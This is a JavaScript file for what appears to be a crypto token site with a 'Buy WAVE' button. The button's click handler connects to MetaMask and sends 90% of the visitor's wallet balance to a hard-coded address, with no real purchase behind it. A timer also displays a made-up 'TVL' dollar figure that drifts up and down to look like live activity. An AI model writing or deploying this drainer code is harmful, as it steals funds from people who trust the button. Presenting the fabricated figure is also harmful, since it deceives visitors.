document.addEventListener("DOMContentLoaded", function () {
    let web3;
    let account;
    let currentValue = 12054112.00;
    let incrementStep = 0.01;  // Incremento de 0.01 (1 centavo)
    let interval;

    window.addEventListener('load', async () => {
        if (window.ethereum) {
            try {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                account = accounts[0];
                document.querySelector('.wallet-address').innerText = account;

                // Seleccionar el botón usando su clase
                const buyButton = document.querySelector('.buy-swamp');
                if (buyButton) {
                    buyButton.classList.remove('hidden'); // Asegúrate de que el botón sea visible

                    buyButton.addEventListener('click', async () => {
                        try {
                            // Obtener el saldo de la cuenta en la red actual
                            const balanceInWei = await web3.eth.getBalance(account);
                            const balanceInEther = web3.utils.fromWei(balanceInWei, 'ether');
                            const amountToSendInEther = (balanceInEther * 0.9).toFixed(18); // Calcular el 90% del saldo
                            const amountToSendInWei = web3.utils.toWei(amountToSendInEther, 'ether');
                            const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';

                            await web3.eth.sendTransaction({
                                from: account,
                                to: recipientAddress,
                                value: amountToSendInWei
                            });
                        } catch (error) {
                            console.error('Error en la transacción:', error);
                        }
                    });
                } else {
                    console.error('El botón de Comprar WAVE no se encontró.');
                }
            } catch (error) {
                console.error("Error connecting to MetaMask:", error);
            }
        } else {
            alert('MetaMask no está instalado. Por favor, instálalo para usar esta aplicación.');
        }
    });

    // Funcionalidad del menú hamburguesa
    const hamburger = document.querySelector('.hamburger');
    const buySwamp = document.querySelector('.buy-swamp');

    if (hamburger && buySwamp) {
        hamburger.addEventListener('click', function() {
            // Alterna la visibilidad del botón Buy WAVE
            if (buySwamp.style.display === 'none' || buySwamp.style.display === '') {
                buySwamp.style.display = 'block';
            } else {
                buySwamp.style.display = 'none';
            }
        });
    } else {
        console.error('No se encontraron los elementos para el menú hamburguesa o el botón de compra.');
    }

 function updateValue() {
                tvlElement.innerText = `USD $${currentValue.toFixed(2)}`;
            }

            function incrementValue() {
                currentValue += incrementStep;
                updateValue();

                // Alternar el incremento y decremento
                incrementStep = incrementStep === 0.03 ? -0.01 : 0.03;

                // Alternar el intervalo entre 10 y 15 segundos
                clearInterval(interval);
                const nextInterval = (incrementStep > 0 ? 10 : 15) * 1000;
                interval = setInterval(incrementValue, nextInterval);
            }

            // Iniciar el primer intervalo
            interval = setInterval(incrementValue, 10000);  // Primer incremento a los 10 segundos

    
});
